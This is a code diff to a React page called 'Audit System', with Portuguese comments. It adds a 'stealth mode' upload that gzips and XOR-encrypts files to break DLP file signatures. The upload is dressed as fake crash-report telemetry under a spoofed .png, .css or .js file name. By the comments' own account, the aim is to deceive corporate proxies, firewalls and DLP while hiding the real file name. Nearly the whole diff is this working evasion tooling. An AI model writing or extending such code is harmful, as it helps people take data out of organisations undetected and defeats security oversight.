@@ -15,10 +15,14 @@ export default function AuditPage() {
   const [token, setToken] = useState('');
   const [files, setFiles] = useState<BlobFile[]>([]);
   const [status, setStatus] = useState({ msg: '', type: '' }); // 'success' | 'error' | 'info'
+
+  // --- CORREÇÃO: Estado de Drag & Drop (Adicionado) ---
   const [isDragging, setIsDragging] = useState(false);
 
-  // Estado do Modo Stealth
+  // Estados de Auditoria (Stealth v6)
   const [stealthMode, setStealthMode] = useState(false);
+  const [useCompression, setUseCompression] = useState(true); // NOVO: Compressão Gzip
+  const [fakeExt, setFakeExt] = useState('.txt'); // NOVO: Extensão Falsa para URL
 
   // Estado para Preview
   const [previewContent, setPreviewContent] = useState<string | null>(null);
@@ -41,56 +45,87 @@ export default function AuditPage() {
     }
   };
 
-  // --- Função 1: Converter arquivo para Base64 ---
-  const toBase64 = (file: File) => new Promise<string>((resolve, reject) => {
+  // --- Função 1: Compressão Gzip (Nativa do Navegador - v6.0) ---
+  const compressFile = async (file: File): Promise<Uint8Array> => {
+    // Cria um stream de compressão gzip direto no browser
+    const stream = file.stream().pipeThrough(new CompressionStream('gzip'));
+    return new Response(stream).arrayBuffer().then(buffer => new Uint8Array(buffer));
+  };
+
+  // --- Função 2: Converter Buffer (Binário) para Base64 ---
+  const bufferToBase64 = (buffer: Uint8Array): string => {
+    let binary = '';
+    const len = buffer.byteLength;
+    for (let i = 0; i < len; i++) {
+      binary += String.fromCharCode(buffer[i]);
+    }
+    return btoa(binary);
+  };
+
+  // --- Função 3: Converter Arquivo Normal para Base64 (Fallback) ---
+  const fileToBase64 = (file: File) => new Promise<string>((resolve, reject) => {
     const reader = new FileReader();
     reader.readAsDataURL(file);
     reader.onload = () => resolve(reader.result as string);
     reader.onerror = error => reject(error);
   });
 
-  // --- Função 2: Criptografia XOR Simples (NOVO) ---
-  // Isso quebra a assinatura do arquivo para o DLP não reconhecer o tipo (PDF, DOCX, etc)
+  // --- Função 4: Criptografia XOR Simples ---
+  // Quebra a assinatura do arquivo (Magic Bytes)
   const xorEncrypt = (text: string, key: string = "audit-key") => {
     let result = "";
     for (let i = 0; i < text.length; i++) {
       result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
     }
-    return btoa(result); // Retorna em Base64 seguro para URL/JSON
+    return btoa(result);
   };
 
-  // Processo de Upload (Atualizado com Lógica Avançada)
+  // Processo de Upload (Atualizado para v6.0)
   const handleUploadProcess = async (file: File) => {
     if (!token) {
       showStatus('Insira o Token de Auditoria.', 'error');
       return;
     }
     setLoading(true);
-    showStatus(stealthMode ? 'Cifrando e Ofuscando (Stealth v2)...' : 'Enviando arquivo...', 'info');
+
+    const msg = stealthMode
+      ? `Stealth v6 (Gzip: ${useCompression ? 'ON' : 'OFF'})...`
+      : 'Enviando normal...';
+    showStatus(msg, 'info');
 
     try {
       let response;
 
       if (stealthMode) {
-        // >>> MODO STEALTH AVANÇADO (OpSec & Bypass) <<<
+        // >>> MODO STEALTH v6 (Compressão + XOR + Spoofing) <<<
 
-        // 1. Converte o arquivo real para string
-        const rawBase64 = await toBase64(file);
+        let contentToEncrypt = '';
 
-        // 2. Aplica Cifra XOR (DLP não consegue ler mais o conteúdo)
-        const encryptedContent = xorEncrypt(rawBase64);
+        if (useCompression) {
+          // 1. Comprime o arquivo (reduz tamanho significativamente)
+          const compressedBytes = await compressFile(file);
+          // 2. Converte para Base64 puro
+          contentToEncrypt = bufferToBase64(compressedBytes);
+        } else {
+          // Sem compressão (Base64 padrão com header data:...)
+          contentToEncrypt = await fileToBase64(file);
+        }
 
-        // 3. Gera um nome falso para aparecer nos logs do Proxy/Firewall da empresa
-        const fakeName = `error_log_dump_${Date.now()}.txt`;
+        // 3. Encripta o conteúdo (XOR)
+        const encryptedContent = xorEncrypt(contentToEncrypt);
 
-        // 4. Cria um payload camuflado (Parece tráfego de telemetria)
+        // 4. Spoofing de URL: Gera um nome falso com a extensão escolhida
+        // O Firewall vai achar que é um .png ou .css
+        const fakeName = `resource_id_${Date.now()}${fakeExt}`;
+
+        // 5. Payload Camuflado
         const mimicPayload = {
           eventType: "system_crash_report",
           timestamp: Date.now(),
           userAgent: navigator.userAgent,
-          // O arquivo real e o nome real vão escondidos aqui dentro
+          compression: useCompression, // Avisa o back para descomprimir
           payload: encryptedContent,
-          realName: file.name
+          realName: file.name // O nome verdadeiro vai escondido aqui
         };
 
         response = await fetch(`/api/upload?filename=${fakeName}&mode=stealth`, {
@@ -104,7 +139,6 @@ export default function AuditPage() {
 
       } else {
         // >>> MODO PADRÃO (Teste de Extensão) <<<
-        // Envio direto para testar se a extensão é bloqueada
         response = await fetch(`/api/upload?filename=${file.name}`, {
           method: 'POST',
           body: file,
@@ -117,7 +151,7 @@ export default function AuditPage() {
         throw new Error(err.error || 'Falha');
       }
 
-      showStatus('Sucesso! Arquivo persistido na nuvem.', 'success');
+      showStatus('Sucesso! Arquivo salvo.', 'success');
       if (inputFileRef.current) inputFileRef.current.value = "";
       await fetchFiles();
     } catch (e: any) {
@@ -144,7 +178,7 @@ export default function AuditPage() {
     if (e.dataTransfer.files && e.dataTransfer.files[0]) {
       handleUploadProcess(e.dataTransfer.files[0]);
     }
-  }, [token, stealthMode]);
+  }, [token, stealthMode, useCompression, fakeExt]); // Dependências atualizadas
 
   // Função de Deletar
   const handleDelete = async (url: string) => {
@@ -165,6 +199,7 @@ export default function AuditPage() {
 
   // Função de Preview
   const handlePreview = async (file: BlobFile) => {
+    // Regex expandido para incluir códigos fonte e configurações
     if (!file.pathname.match(/\.(txt|csv|log|json|md|py|js|ts|tsx|java|c|cpp|sql|sh|xml|yaml|yml|ini|env)$/i)) {
       window.open(file.url, '_blank');
       return;
@@ -184,7 +219,7 @@ export default function AuditPage() {
     <main className="min-h-screen bg-gray-950 text-gray-300 font-sans p-6">
       <div className="max-w-4xl mx-auto">
         <header className="flex flex-col md:flex-row justify-between items-center mb-6 border-b border-gray-800 pb-4 gap-4">
-          <h1 className="text-2xl font-bold text-green-500">Audit System <span className="text-xs bg-green-900 text-green-300 px-2 py-0.5 rounded">v5.0 XOR</span></h1>
+          <h1 className="text-2xl font-bold text-green-500">Audit System <span className="text-xs bg-green-900 text-green-300 px-2 py-0.5 rounded">v6.0 Gzip+Spoof</span></h1>
           <input
             type="password"
             value={token}
@@ -202,28 +237,57 @@ export default function AuditPage() {
           </div>
         )}
 
-        {/* --- CONTROLE DO MODO STEALTH --- */}
-        <div className={`mb-6 p-4 rounded border flex flex-col sm:flex-row items-center gap-4 transition-colors
+        {/* --- PAINEL DE CONTROLE STEALTH --- */}
+        <div className={`mb-6 p-4 rounded border flex flex-col gap-4 transition-colors
           ${stealthMode ? 'bg-green-900/20 border-green-600' : 'bg-gray-900 border-gray-700'}`}>
-          <div className="flex items-center h-5">
+
+          <div className="flex items-center gap-3">
             <input
               id="stealth-mode"
               type="checkbox"
               checked={stealthMode}
               onChange={(e) => setStealthMode(e.target.checked)}
-              className="w-6 h-6 text-green-600 bg-gray-700 border-gray-500 rounded focus:ring-green-500 cursor-pointer"
+              className="w-5 h-5 text-green-600 bg-gray-700 border-gray-500 rounded cursor-pointer"
             />
-          </div>
-          <div className="flex-1">
             <label htmlFor="stealth-mode" className={`font-bold text-lg cursor-pointer ${stealthMode ? 'text-green-400' : 'text-white'}`}>
-              {stealthMode ? '🔒 MODO STEALTH ATIVADO (XOR)' : '🔓 Modo Padrão'}
+              {stealthMode ? '🔒 MODO STEALTH ATIVADO' : '🔓 Modo Padrão'}
             </label>
-            <p className="text-xs sm:text-sm text-gray-400">
-              {stealthMode
-                ? 'Arquivos serão Cifrados (XOR) e enviados como logs de erro falsos para enganar Proxy e DLP.'
-                : 'Envio direto (Cleartext) para testar bloqueio de extensão.'}
-            </p>
           </div>
+
+          {stealthMode && (
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pl-8 border-t border-gray-700/50 pt-4">
+              {/* Opção de Compressão */}
+              <div className="flex items-center gap-2">
+                <input
+                  id="compression"
+                  type="checkbox"
+                  checked={useCompression}
+                  onChange={(e) => setUseCompression(e.target.checked)}
+                  className="w-4 h-4 text-blue-500 bg-gray-700 border-gray-500 rounded"
+                />
+                <label htmlFor="compression" className="text-sm cursor-pointer hover:text-white select-none">
+                  Ativar Compressão Gzip (Reduz tamanho)
+                </label>
+              </div>
+
+              {/* Seletor de Extensão Falsa */}
+              <div className="flex items-center gap-2">
+                <label className="text-sm text-gray-400">Disfarçar URL como:</label>
+                <select
+                  value={fakeExt}
+                  onChange={(e) => setFakeExt(e.target.value)}
+                  className="bg-gray-800 border border-gray-600 text-white text-xs rounded px-2 py-1 outline-none focus:border-green-500"
+                >
+                  <option value=".txt">Log de Texto (.txt)</option>
+                  <option value=".png">Imagem PNG (.png)</option>
+                  <option value=".jpg">Imagem JPG (.jpg)</option>
+                  <option value=".css">Estilo CSS (.css)</option>
+                  <option value=".js">Script JS (.js)</option>
+                  <option value=".dat">Dados Binários (.dat)</option>
+                </select>
+              </div>
+            </div>
+          )}
         </div>
 
         {/* Upload Area (Drag & Drop) */}
@@ -253,15 +317,14 @@ export default function AuditPage() {
           </label>
         </div>
 
-        {/* Botão para carregar lista */}
+        {/* Lista de Arquivos */}
         <div className="flex justify-between items-center mb-4">
-          <h2 className="text-xl font-semibold text-gray-200">Arquivos Auditados</h2>
+          <h2 className="text-xl font-semibold text-gray-200">Arquivos na Nuvem</h2>
           <button onClick={fetchFiles} className="text-xs sm:text-sm bg-gray-800 hover:bg-gray-700 px-3 py-1.5 rounded border border-gray-700 transition-colors">
             ↻ Atualizar Lista
           </button>
         </div>
 
-        {/* Lista de Arquivos */}
         <div className="space-y-3">
           {files.map((file) => (
             <div key={file.url} className="group flex items-center justify-between bg-gray-900 p-3 rounded-lg border border-gray-800 hover:border-green-900/50 transition-all">
